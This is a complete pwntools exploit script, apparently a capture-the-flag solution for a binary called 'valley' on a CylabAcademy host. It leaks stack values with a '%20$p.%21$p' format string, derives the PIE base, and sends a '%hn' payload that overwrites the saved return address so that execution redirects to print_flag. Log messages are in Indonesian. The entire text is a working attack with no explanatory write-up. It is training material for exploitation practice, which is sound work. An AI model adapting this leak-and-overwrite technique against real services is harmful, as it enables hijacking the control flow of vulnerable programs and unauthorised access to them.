#!/usr/bin/env python3
from pwn import *
import re

HOST = "chatelaine.cylabacademy.net"
PORT = 23085

context.binary = elf = ELF("./valley", checksec=False)
context.log_level = "info"


def main():
    io = remote(HOST, PORT)

    io.recvuntil(b"Welcome to the Echo Valley, Try Shouting: \n")

    io.sendline(b"%20$p.%21$p")
    leak_line = io.recvline()
    log.info(f"Leak: {leak_line.strip()!r}")

    leaks = re.findall(rb"0x[0-9a-fA-F]+", leak_line)
    if len(leaks) < 2:
        log.failure("Tidak berhasil memperoleh dua nilai leak.")
        io.close()
        return

    saved_rbp = int(leaks[0], 16)
    ret_leak = int(leaks[1], 16)

    return_offset = elf.sym["main"] + 0x12
    pie_base = ret_leak - return_offset
    print_flag = pie_base + elf.sym["print_flag"]
    return_slot = saved_rbp - 8

    log.success(f"Return leak : {ret_leak:#x}")
    log.info(f"PIE base    : {pie_base:#x}")
    log.success(f"print_flag  : {print_flag:#x}")
    log.info(f"Return slot : {return_slot:#x}")

    count = print_flag & 0xffff
    fmt = f"%1${count}c%8$hn".encode()

    if len(fmt) >= 16:
        log.failure("Format string terlalu panjang.")
        io.close()
        return

    padding = b"A" * (15 - len(fmt)) + b"\x00"
    payload = fmt + padding + p64(return_slot)

    log.info(f"Format length: {len(fmt)}")
    log.info(f"Payload length: {len(payload)}")

    io.sendline(payload)
    io.sendline(b"exit")

    output = io.recvall(timeout=5)
    print(output.decode(errors="replace"), end="")
    io.close()


if __name__ == "__main__":
    main()
